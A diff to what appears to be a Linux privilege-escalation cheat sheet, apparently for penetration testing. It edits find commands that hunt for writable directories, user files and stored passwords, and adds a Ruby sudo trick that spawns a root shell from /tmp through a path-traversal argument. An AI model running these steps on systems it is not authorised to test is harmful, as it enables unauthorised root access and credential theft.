@@ -43,7 +43,7 @@
 		- `find / -perm -o w -type d 2>/dev/null` searches for world-writable directories.
 		- `find / -perm -o x -type d 2>/dev/null` searches for world-executable directories.
 		- `find / -name perl*` or `find / -name python*` or `find / -name gcc*` searches for development tools and supported languages.
-		- `find / -uid <uid> -type f -ls 2>/dev/null | grep -v "/proc"` to get the files owned by the user, get `uid` from `/etc/passwd`.
+		- `find / -uid <uid> -type f -ls 2>/dev/null | grep -v "/proc"` to get the files owned by the user, get `uid` from `id` or `/etc/passwd`.
 		- `find / -name "*<username>*" -type f -ls 2>/dev/null` to get the files with the username in it.
 		- `grep -i password -r .` to get the files with the word password in them.
 		- #### **IMPORTANT**
@@ -123,3 +123,6 @@
 		- Compile the code using `gcc nfs.c -o nfs -w`.
 		- Set the SUID bit using `chmod +s nfs`.
 		- Since the share is mounted on the attack machine, the files will be present on the target.
+- ## Ruby
+	- When using `sudo -l` if ruby is found, create a file that executes `/bin/sh` in `/tmp` then call it using `/usr/bin/ruby /root/../tmp/shell.rb`. ![](ruby-privesc.png)
+	- 
